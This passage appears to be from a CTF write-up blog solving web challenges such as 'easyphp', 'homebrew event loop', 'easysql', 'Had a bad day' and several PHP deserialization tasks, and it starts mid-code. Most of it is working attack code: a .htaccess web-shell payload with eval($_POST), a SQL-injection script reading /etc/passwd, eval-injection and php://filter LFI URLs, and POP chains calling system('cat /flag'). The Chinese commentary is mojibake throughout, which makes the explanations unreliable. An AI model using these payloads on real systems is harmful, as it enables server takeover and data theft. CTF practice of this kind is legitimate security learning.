$this-&gt;ext=end($ext_arr);        if($this-&gt;ext==&quot;png&quot;){            return 1;        }else{            return 0;        }    }    public function __get($name)    {        return $this-&gt;except[$name];    }    public function __call($name, $arguments)    {        if($this-&gt;{$name}){            $this-&gt;{$this-&gt;{$name}}($arguments);        }    }}</code></pre><h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h2><p>ç®€å•çš„smarty ssti</p><h2 id="Futurella"><a href="#Futurella" class="headerlink" title="Futurella"></a>Futurella</h2><p>F12</p><h2 id="2020-æ–°æ˜¥çº¢åŒ…é¢˜-1"><a href="#2020-æ–°æ˜¥çº¢åŒ…é¢˜-1" class="headerlink" title="2020 æ–°æ˜¥çº¢åŒ…é¢˜ 1"></a>2020 æ–°æ˜¥çº¢åŒ…é¢˜ 1</h2><p>å’Œ2019çš„eisä¸­çš„popä¸€æ‘¸ä¸€æ ·,æˆ‘ä¹‹å‰ä¹Ÿåšå‡ºæ¥äº†,å†çœ‹çš„æ—¶å€™å±…ç„¶ä¸ä¼šäº†???????????</p><p> <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> </p><p>å”¯ä¸€ä¸åŒçš„æ˜¯,è¿™é¢˜ä¼šå¯¹æ–‡ä»¶åè¿›è¡Œæ£€æµ‹</p><pre><code class="php">public function getCacheKey(string $name): string {        // ä½¿ç¼“å­˜æ–‡ä»¶åéšæœº        $cache_filename = $this-&gt;options[&#39;prefix&#39;] . uniqid() . $name;        if(substr($cache_filename, -strlen(&#39;.php&#39;)) === &#39;.php&#39;) {            die(&#39;?&#39;);        }        return $cache_filename;    }</code></pre><p>æˆ‘åœ¨è¿™é‡Œå¡äº†å¥½ä¹…,è¿˜æ˜¯å»å·çª¥wpè§£å†³çš„</p><p>æˆ‘ä»¬åˆ©ç”¨<code>uniqid()/../filename</code>æ¥ç»•è¿‡uniqid,</p><p>åˆ©ç”¨<code>index.php/.</code>=<code>index.php</code>æ¥ç»•è¿‡åç¼€åæ£€æµ‹</p><p>å…¶ä»–è§£æ³•: <a href="https://www.zhaoj.in/read-6397.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6397.html</a> </p><ol><li>åˆ©ç”¨.user.ini</li><li>åˆ©ç”¨shellä¸­``çš„ä¼˜å…ˆçº§å¤§äºâ€æ¥å‘½ä»¤æ‰§è¡Œ</li></ol><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><pre><code class="php">&lt;?php    $files = scandir(&#39;./&#39;);     foreach($files as $file) {        if(is_file($file)){            if ($file !== &quot;index.php&quot;) {                unlink($file);            }        }    }    include_once(&quot;fl3g.php&quot;);    if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) {        highlight_file(__FILE__);        die();    }    $content = $_GET[&#39;content&#39;];    if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) {        echo &quot;Hacker&quot;;        die();    }    $filename = $_GET[&#39;filename&#39;];    if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) {        echo &quot;Hacker&quot;;        die();    }    $files = scandir(&#39;./&#39;);     foreach($files as $file) {        if(is_file($file)){            if ($file !== &quot;index.php&quot;) {                unlink($file);            }        }    }    file_put_contents($filename, $content . &quot;\nJust one chance&quot;);?&gt;</code></pre><p>å¯ä»¥ä»»æ„å†™æ–‡ä»¶,å†™ä¸ªphpæ–‡ä»¶åå‘ç°,ä¸è§£æ,ä¼°è®¡æ˜¯htaccessçš„,</p><p>äºæ˜¯å†™htaccess,åˆ©ç”¨<code>#\</code>æ¥ç»•è¿‡æœ«å°¾æ·»åŠ <code>\nJust one chance</code>,å°†å…¶æ³¨é‡Š</p><p>æœ€åçš„payload</p><pre><code>#&lt;?php die(eval($_POST[1]));?&gt;php_value auto_prepend_fi\le &quot;.htaccess&quot;#\</code></pre><h2 id="Kookie"><a href="#Kookie" class="headerlink" title="Kookie"></a>Kookie</h2><p>ä¿®æ”¹cookie</p><h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><pre><code class="python">from flask import Flask, session, request, Responseimport urllibapp = Flask(__name__)app.secret_key = &#39;*********************&#39;  # censoredurl_prefix = &#39;/d5afe1f66147e857&#39;def FLAG():    return &#39;*********************&#39;  # censoreddef trigger_event(event):    session[&#39;log&#39;].append(event)    if len(session[&#39;log&#39;]) &gt; 5:        session[&#39;log&#39;] = session[&#39;log&#39;][-5:]    if type(event) == type([]):        request.event_queue += event    else:        request.event_queue.append(event)def get_mid_str(haystack, prefix, postfix=None):    haystack = haystack[haystack.find(prefix)+len(prefix):]    if postfix is not None:        haystack = haystack[:haystack.find(postfix)]    return haystackclass RollBackException:    passdef execute_event_loop():    valid_event_chars = set(        &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#39;)    resp = None    while len(request.event_queue) &gt; 0:        # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;        event = request.event_queue[0]        request.event_queue = request.event_queue[1:]        if not event.startswith((&#39;action:&#39;, &#39;func:&#39;)):            continue        for c in event:            if c not in valid_event_chars:                break        else:            is_action = event[0] == &#39;a&#39;            action = get_mid_str(event, &#39;:&#39;, &#39;;&#39;)            args = get_mid_str(event, action+&#39;;&#39;).split(&#39;#&#39;)            try:                event_handler = eval(                    action + (&#39;_handler&#39; if is_action else &#39;_function&#39;))                ret_val = event_handler(args)            except RollBackException:                if resp is None:                    resp = &#39;&#39;                resp += &#39;ERROR! All transactions have been cancelled. &lt;br /&gt;&#39;                resp += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;                session[&#39;num_items&#39;] = request.prev_session[&#39;num_items&#39;]                session[&#39;points&#39;] = request.prev_session[&#39;points&#39;]                break            except Exception, e:                if resp is None:                    resp = &#39;&#39;                # resp += str(e) # only for debugging                continue            if ret_val is not None:                if resp is None:                    resp = ret_val                else:                    resp += ret_val    if resp is None or resp == &#39;&#39;:        resp = (&#39;404 NOT FOUND&#39;, 404)    session.modified = True    return resp@app.route(url_prefix+&#39;/&#39;)def entry_point():    querystring = urllib.unquote(request.query_string)    request.event_queue = []    if querystring == &#39;&#39; or (not querystring.startswith(&#39;action:&#39;)) or len(querystring) &gt; 100:        querystring = &#39;action:index;False#False&#39;    if &#39;num_items&#39; not in session:        session[&#39;num_items&#39;] = 0        session[&#39;points&#39;] = 3        session[&#39;log&#39;] = []    request.prev_session = dict(session)    trigger_event(querystring)    return execute_event_loop()# handlers/functions below --------------------------------------def view_handler(args):    page = args[0]    html = &#39;&#39;    html += &#39;[INFO] you have {} diamonds, {} points now.&lt;br /&gt;&#39;.format(        session[&#39;num_items&#39;], session[&#39;points&#39;])    if page == &#39;index&#39;:        html += &#39;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#39;        html += &#39;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#39;        html += &#39;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#39;    elif page == &#39;shop&#39;:        html += &#39;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#39;    elif page == &#39;reset&#39;:        del session[&#39;num_items&#39;]        html += &#39;Session reset.&lt;br /&gt;&#39;    html += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;    return htmldef index_handler(args):    bool_show_source = str(args[0])    bool_download_source = str(args[1])    if bool_show_source == &#39;True&#39;:        source = open(&#39;eventLoop.py&#39;, &#39;r&#39;)        html = &#39;&#39;        if bool_download_source != &#39;True&#39;:            html += &#39;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#39;            html += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;        for line in source:            if bool_download_source != &#39;True&#39;:                html += line.replace(&#39;&amp;&#39;, &#39;&amp;amp;&#39;).replace(&#39;\t&#39;, &#39;&amp;nbsp;&#39;*4).replace(                    &#39; &#39;, &#39;&amp;nbsp;&#39;).replace(&#39;&lt;&#39;, &#39;&amp;lt;&#39;).replace(&#39;&gt;&#39;, &#39;&amp;gt;&#39;).replace(&#39;\n&#39;, &#39;&lt;br /&gt;&#39;)            else:                html += line        source.close()        if bool_download_source == &#39;True&#39;:            headers = {}            headers[&#39;Content-Type&#39;] = &#39;text/plain&#39;            headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=serve.py&#39;            return Response(html, headers=headers)        else:            return html    else:        trigger_event(&#39;action:view;index&#39;)def buy_handler(args):    num_items = int(args[0])    if num_items &lt;= 0:        return &#39;invalid number({}) of diamonds to buy&lt;br /&gt;&#39;.format(args[0])    session[&#39;num_items&#39;] += num_items    trigger_event([&#39;func:consume_point;{}&#39;.format(        num_items), &#39;action:view;index&#39;])def consume_point_function(args):    point_to_consume = int(args[0])    if session[&#39;points&#39;] &lt; point_to_consume:        raise RollBackException()    session[&#39;points&#39;] -= point_to_consumedef show_flag_function(args):    flag = args[0]    # return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.    return &#39;You naughty boy! ;) &lt;br /&gt;&#39;def get_flag_handler(args):    if session[&#39;num_items&#39;] &gt;= 5:        # show_flag_function has been disabled, no worries        trigger_event(&#39;func:show_flag;&#39; + FLAG())    trigger_event(&#39;action:view;index&#39;)if __name__ == &#39;__main__&#39;:    app.run(debug=False, host=&#39;0.0.0.0&#39;)</code></pre><p>æˆ‘ä»¬è§‚å¯Ÿ:</p><pre><code class="python">            action = get_mid_str(event, &#39;:&#39;, &#39;;&#39;)            args = get_mid_str(event, action+&#39;;&#39;).split(&#39;#&#39;)            try:                event_handler = eval(                    action + (&#39;_handler&#39; if is_action else &#39;_function&#39;))                ret_val = event_handler(args)</code></pre><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥</p><p>åœ¨actionåé¢åŠ ä¸ª#,æ¥è¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œ,ä½†æ˜¯ä¼ å…¥çš„å‚æ•°åªèƒ½æ˜¯ä¸€ä¸ªlist,åœ¨è¿™é‡Œå¡ä½æˆ‘äº†</p><p>ç»§ç»­åˆ†æå‘ç°,è¿™ä¸ªç¨‹åºçš„åŠŸèƒ½éƒ½åŸºäºè‡ªåˆ¶çš„event_loop,è€Œtrigger_event()è´Ÿè´£æ·»åŠ event,å½“ä¼ å…¥ä¸€ä¸ªlistæ—¶,ä»–ä¼šç›´æ¥event+=list</p><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æ§åˆ¶event_loopçš„æ‰§è¡Œé¡ºåº,</p><p>åœ¨get_flag_handlerä¸­,æˆ‘ä»¬å¯ä»¥å°†flagè®°å½•åˆ°sessionä¸­ä½†æ˜¯,è¦æ±‚diomand&gt;=5,è€Œæ­£å¸¸æ¥è¯´æˆ‘ä»¬æœ€å¤šåªæœ‰3ä¸ª</p><p>æˆ‘ä»¬è§‚å¯Ÿbuy</p><pre><code class="python">def buy_handler(args):    num_items = int(args[0])    if num_items &lt;= 0:        return &#39;invalid number({}) of diamonds to buy&lt;br /&gt;&#39;.format(args[0])    session[&#39;num_items&#39;] += num_items    trigger_event([&#39;func:consume_point;{}&#39;.format(        num_items), &#39;action:view;index&#39;])</code></pre><p>è¿™ä¸ªæ˜¯å…ˆå°†ç‰©å“æ·»åŠ ç„¶åå‘event_loopä¸­æ·»åŠ äº‹ä»¶,ç»“åˆæˆ‘ä»¬å‰é¢çš„å‘ç°,æˆ‘ä»¬å¯ä»¥åœ¨è°ƒç”¨buy_handleråç›´æ¥è°ƒç”¨get_flag_handler,è¿™æ ·æˆ‘ä»¬å°±èƒ½æ‹¿åˆ°flagäº†</p><p>è®¿é—®:<code>d5afe1f66147e857/?action:trigger_event%23;action:buy;99%23action:get_flag;%23</code>,å°†sessionè§£ç åæ‹¿åˆ°flag</p><p><code>flag{ba772083-fe23-4258-897e-63c9a99ff66f}</code></p><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><pre><code class="python">import requestsimport re,timeimport binasciidef sql_inj(sql):    result=&quot;&quot;    count=1    while True:        if result!=&quot;&quot;:            username=&quot;admin\&quot;-(updatexml(1,concat(0x7e,replace(({sql}),{result},\&quot;\&quot;),0x7e),1))#&quot;.format(sql=sql,result=(&quot;0x&quot;+str(binascii.hexlify(bytes(result,encoding=&quot;ascii&quot;)),encoding=&quot;ascii&quot;)))        else:            username=&quot;admin\&quot;-(updatexml(1,concat(0x7e,replace(({sql}),\&quot;\&quot;,\&quot;\&quot;),0x7e),1))#&quot;.format(sql=sql,result=(&quot;0x&quot;+str(binascii.hexlify(bytes(result,encoding=&quot;ascii&quot;)),encoding=&quot;ascii&quot;)))        burp0_url = &quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn:80/register.php&quot;        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;r658aaumj82f5f6itd5freua14&quot;}        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Origin&quot;: &quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn/register.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}        burp0_data = {&quot;username&quot;:username , &quot;password&quot;: &quot;a&quot;, &quot;email&quot;: &quot;a&quot;}        res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)        print(username)        #print(res.text)        session = requests.session()        url=&quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn/login.php&quot;        data={            &quot;username&quot;:username,            &quot;password&quot;:&quot;a&quot;        }        res=session.post(url, data=data)         #print(res.text)        res=session.post(&quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn/changepwd.php&quot;,data={&quot;oldpass&quot;:&quot;a&quot;,&quot;newpass&quot;:&quot;a&quot;})        print(res.text)        tmp=re.match(r&quot;.*XPATH syntax error: &#39;(.*)&#39;.*&quot;,res.text,flags=re.DOTALL).group(1)        if tmp!=&quot;&quot; and tmp[0]==&quot;~&quot;:            tmp=tmp[1:]        if tmp!=&quot;&quot; and tmp[-1]==&quot;~&quot;:            tmp=tmp[:-1]         result+=tmp        print(result)        if tmp.strip() is &quot;&quot;:            break        count+=30        time.sleep(0.5)    print(result)sql_inj(&quot;select(group_concat(load_file(0x2f6574632f706173737764)))&quot;)</code></pre><pre><code>article,flag,usersflagtitle,contentname,pwd,email,real_flag_1s_here</code></pre><p><code>flag{9b73df68-406f-439e-9076-c9a9f37f5255}</code></p><p>äºŒæ¬¡æ³¨å…¥</p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>easy</p><h2 id="MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢"><a href="#MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢" class="headerlink" title="[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢"></a>[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><p>åç¼€åé™åˆ¶:php</p><p>ä¸Šä¼ htaccess+å›¾ç‰‡é©¬</p><p><code>flag{c4ab5af4-4cb4-45bf-9cb3-ebe35922eca9}</code></p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>ä¿®æ”¹xffå¤´</p><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>æµ‹è¯•å‘ç°</p><pre><code>Warning: include(meowers&#39;.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 37Warning: include(): Failed opening &#39;meowers&#39;.php&#39; for inclusion (include_path=&#39;.:/usr/local/lib/php&#39;) in /var/www/html/index.php on line 37</code></pre><p>index.php</p><pre><code class="php">&lt;html&gt;  &lt;head&gt;    &lt;meta charset=&quot;utf-8&quot;&gt;    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;    &lt;meta name=&quot;description&quot; content=&quot;Images that spark joy&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;&gt;    &lt;title&gt;Had a bad day?&lt;/title&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/material.min.css&quot;&gt;    &lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;  &lt;/head&gt;  &lt;body&gt;    &lt;div class=&quot;page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100&quot;&gt;      &lt;header class=&quot;page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800&quot;&gt;        &lt;div class=&quot;mdl-layout__header-row&quot;&gt;          &lt;span class=&quot;mdl-layout-title&quot;&gt;Had a bad day?&lt;/span&gt;          &lt;div class=&quot;mdl-layout-spacer&quot;&gt;&lt;/div&gt;        &lt;div&gt;      &lt;/header&gt;      &lt;div class=&quot;page-ribbon&quot;&gt;&lt;/div&gt;      &lt;main class=&quot;page-main mdl-layout__content&quot;&gt;        &lt;div class=&quot;page-container mdl-grid&quot;&gt;          &lt;div class=&quot;mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone&quot;&gt;&lt;/div&gt;          &lt;div class=&quot;page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col&quot;&gt;            &lt;div class=&quot;page-crumbs mdl-color-text--grey-500&quot;&gt;            &lt;/div&gt;            &lt;h3&gt;Cheer up!&lt;/h3&gt;              &lt;p&gt;                Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!              &lt;/p&gt;              &lt;div class=&quot;page-include&quot;&gt;              &lt;?php                $file = $_GET[&#39;category&#39;];                if(isset($file))                {                    if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;)){                        include ($file . &#39;.php&#39;);                    }                    else{                        echo &quot;Sorry, we currently only support woofers and meowers.&quot;;                    }                }                ?&gt;            &lt;/div&gt;          &lt;form action=&quot;index.php&quot; method=&quot;get&quot; id=&quot;choice&quot;&gt;              &lt;center&gt;&lt;button onclick=&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name=&quot;category&quot; value=&quot;woofers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Woofers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;              &lt;button onclick=&quot;document.getElementById(&#39;choice&#39;).submit();&quot; name=&quot;category&quot; value=&quot;meowers&quot; class=&quot;mdl-button mdl-button--colored mdl-button--raised mdl-js-button mdl-js-ripple-effect&quot; data-upgraded=&quot;,MaterialButton,MaterialRipple&quot;&gt;Meowers&lt;span class=&quot;mdl-button__ripple-container&quot;&gt;&lt;span class=&quot;mdl-ripple is-animating&quot; style=&quot;width: 189.356px; height: 189.356px; transform: translate(-50%, -50%) translate(31px, 25px);&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/button&gt;&lt;/center&gt;          &lt;/form&gt;          &lt;/div&gt;        &lt;/div&gt;      &lt;/main&gt;    &lt;/div&gt;    &lt;script src=&quot;js/material.min.js&quot;&gt;&lt;/script&gt;  &lt;/body&gt;&lt;/html&gt;</code></pre><p>åœ¨æ‰«ç›®å½•æ—¶å‘ç°flag.php</p><p><code>http://12d20382-ff0d-44bf-abfd-50a08a5b8604.node3.buuoj.cn/index.php?category=php://filter/read=convert.base64-encode/resource=woofers/../flag</code></p><h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><pre><code class="php">&lt;?phperror_reporting(0);if (isset($_GET[&#39;source&#39;])) {  show_source(__FILE__);  exit();}function is_valid($str) {  $banword = [    // no path traversal    &#39;\.\.&#39;,    // no stream wrapper    &#39;(php|file|glob|data|tp|zip|zlib|phar):&#39;,    // no data exfiltration    &#39;flag&#39;  ];  $regexp = &#39;/&#39; . implode(&#39;|&#39;, $banword) . &#39;/i&#39;;  if (preg_match($regexp, $str)) {    return false;  }  return true;}$body = file_get_contents(&#39;php://input&#39;);$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#39;page&#39;])) {  $page = $json[&#39;page&#39;];  $content = file_get_contents($page);  if (!$content || !is_valid($content)) {    $content = &quot;&lt;p&gt;not found&lt;/p&gt;\n&quot;;  }} else {  $content = &#39;&lt;p&gt;invalid request&lt;/p&gt;&#39;;}// no data exfiltration!!!$content = preg_replace(&#39;/HarekazeCTF\{.+\}/i&#39;, &#39;HarekazeCTF{&amp;lt;censored&amp;gt;}&#39;, $content);echo json_encode([&#39;content&#39; =&gt; $content]);</code></pre><p>å­¦åˆ°äº†å­¦åˆ°äº†</p><p>json_decodeåœ¨è§£æç±»ä¼¼<code>\u0020</code>çš„æ—¶å€™ä¼šæŠŠä»–å½“æˆä¸€ä¸ªunicodeå­—ç¬¦,ä¹Ÿå°±æ˜¯è¯´å®ƒä¼šå˜æˆ<code>ç©ºæ ¼</code></p><p>è¿™ä¸ªåœ¨å®˜æ–¹æ–‡æ¡£é‡Œä¹Ÿæœ‰æ¶‰åŠ<code>PHP implements a superset of JSON as specified in the original Â» RFC 7159.</code></p><p>å»æŸ¥RFC 7159å°±ä¼šå‘ç°</p><blockquote><pre><code>  Any character may be escaped.  If the character is in the Basic  Multilingual Plane (U+0000 through U+FFFF), then it may be  represented as a six-character sequence: a reverse solidus, followed  by the lowercase letter u, followed by four hexadecimal digits that  encode the character&#39;s code point.  The hexadecimal letters A though  F can be upper or lower case.  So, for example, a string containing  only a single reverse solidus character may be represented as  &quot;\u005C&quot;.</code></pre></blockquote><h2 id="CISCN2019-æ€»å†³èµ›-Day1-Web4-Laravel1"><a href="#CISCN2019-æ€»å†³èµ›-Day1-Web4-Laravel1" class="headerlink" title="[CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1"></a>[CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1</h2><pre><code class="php">&lt;?php//backup in source.tar.gznamespace App\Http\Controllers;class IndexController extends Controller{    public function index(\Illuminate\Http\Request $request){        $payload=$request-&gt;input(&quot;payload&quot;);        if(empty($payload)){            highlight_file(__FILE__);        }else{            @unserialize($payload);        }    }}</code></pre><p>å¾ˆæ˜æ˜¾æ˜¯è¦è®©æˆ‘ä»¬æ‰¾ä¸ªpopé“¾,åˆšå¼€å§‹æˆ‘å¤©çœŸçš„ä»¥ä¸ºå¯ä»¥ç›´æ¥ç”¨cveçš„,ä¸€è¡Œæ³¨é‡Šè®©æˆ‘æ˜ç™½äº†æˆ‘çš„å¤©çœŸ</p><p><img src="https://i.loli.net/2020/04/16/OFIVpwyUmARvcdE.png" alt="image55205"></p><p>è¿™ä¸ªpopé“¾æ˜¾ç„¶è¦ä»<code>__destruct</code>å¼€å§‹</p><p><img src="https://i.loli.net/2020/04/16/qu6dkEK9UMVw2IQ.png" alt="image55300"></p><p><img src="https://i.loli.net/2020/04/16/of6Vy52wIlsvBgQ.png" alt="image55369"></p><p>åœ¨ç»è¿‡ä¸€ç•ªæœç´¢+wpè§‚çœ‹å¤§æ³•å,æˆ‘æ‰¾åˆ°äº†</p><p>è¿™é‡Œæœ‰ä¸ª<code>$f($items)</code>,å¯ä»¥ç›´æ¥å‘½ä»¤æ‰§è¡Œ,å‰ææ˜¯æ²¡æœ‰ç›´æ¥ä»<code>foreach</code>é‚£é‡Œé€€å‡º</p><p>ä¸çŸ¥é“ä¸ºå•¥,æœ¬æœºä¸å¯ä»¥,è€Œé¶åœºå¯ä»¥???</p><pre><code class="php">&lt;?phpnamespace Symfony\Component\Cache\Adapter;class TagAwareAdapter{    private $deferred;    private $getTagsByKey;    function __construct(){        $this-&gt;deferred=&quot;cat /flag&quot;;        $this-&gt;getTagsByKey=&quot;system&quot;;    }}$a = new \Symfony\Component\Cache\Adapter\TagAwareAdapter();echo urlencode(serialize($a));</code></pre><p><code>flag{d5b22868-43a5-4784-be2f-6021702cfe89}</code></p><h2 id="MRCTF2020-å¥—å¨ƒ"><a href="#MRCTF2020-å¥—å¨ƒ" class="headerlink" title="[MRCTF2020]å¥—å¨ƒ"></a>[MRCTF2020]å¥—å¨ƒ</h2><p>2333333333</p><p><code>flag{b84a1566-98fb-43aa-967d-95b86c42da14}</code></p><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><pre><code class="php">&lt;?phpclass Modifier {    protected  $var=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;    public function append($value){        include($value);    }    public function __invoke(){        $this-&gt;append($this-&gt;var);    }}class Show{    public $source;    public $str;    public function __toString(){        return $this-&gt;str-&gt;source;    }    public function __wakeup(){        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) {            echo &quot;hacker&quot;;            $this-&gt;source = &quot;index.php&quot;;        }    }}class Test{    public $p;    public function __construct(){        $this-&gt;p = new Modifier();    }    public function __get($key){        $function = $this-&gt;p;        return $function();    }}$a=new Show();$b=new Show();$b-&gt;str=new Test();$a-&gt;source=$b;echo urlencode(serialize($a));?&gt;</code></pre><p><code>flag{ff09736d-ed1f-4089-8906-3379cbb7e019}</code></p><h2 id="GYCTF2020-Easyphp"><a href="#GYCTF2020-Easyphp" class="headerlink" title="[GYCTF2020]Easyphp"></a>[GYCTF2020]Easyphp</h2><p><code>UpdateHelper(__destruct)-&gt;User(__toString)-&gt;Info(__call)-&gt;dbCtrl(login)</code></p><pre><code class="php">&lt;?phpfunction safe($parm){    $array= array(&#39;union&#39;,&#39;regexp&#39;,&#39;load&#39;,&#39;into&#39;,&#39;flag&#39;,&#39;file&#39;,&#39;insert&#39;,&quot;&#39;&quot;,&#39;\\&#39;,&quot;*&quot;,&quot;alter&quot;);    return str_replace($array,&#39;hacker&#39;,$parm);}class User{    public $id=1;    public $age;    public $nickname;    public function __construct(){        $this-&gt;nickname=new Info();        $this-&gt;age=&quot;UPDATE user SET password=\&quot;c4ca4238a0b923820dcc509a6f75849b\&quot; where username=?&quot;;    } }class dbCtrl{    public $hostname=&quot;127.0.0.1&quot;;    public $dbuser=&quot;root&quot;;    public $dbpass=&quot;root&quot;;    public $database=&quot;test&quot;;    public $name;    public $password;    public $mysqli;    public $token;    public function __construct()    {        $this-&gt;name=&#39;admin&#39;;        $this-&gt;password=&#39;1&#39;;        $this-&gt;token=&#39;admin&#39;;    }}class Info{    public $age;    public $nickname;    public $CtrlCase;    public function __construct(){        $this-&gt;age=&quot;&quot;;        $this-&gt;nickname=&quot;&quot;;        $this-&gt;CtrlCase=new dbCtrl();    }}Class UpdateHelper{    public $id=&quot;&quot;;    public $newinfo=&quot;&quot;;    public $sql=&quot;&quot;;    public function __construct(){        $this-&gt;sql=new User();    }}$nickname=&quot;&quot;;$a=new User();$evil=str_replace(&quot;flag&quot;,&quot;alag&quot;,serialize($a));#echo $evil;$age=&#39;&quot;;s:8:&quot;nickname&quot;;&#39;.$evil.&#39;s:8:&quot;CtrlCase&quot;;N;};&#39;;$len=strlen($age);for($i=0;$i&lt;$len;$i++){    $age=&quot;union&quot;.$age;};$tmp=serialize(new Info($age,$nickname));$result=safe($tmp);echo 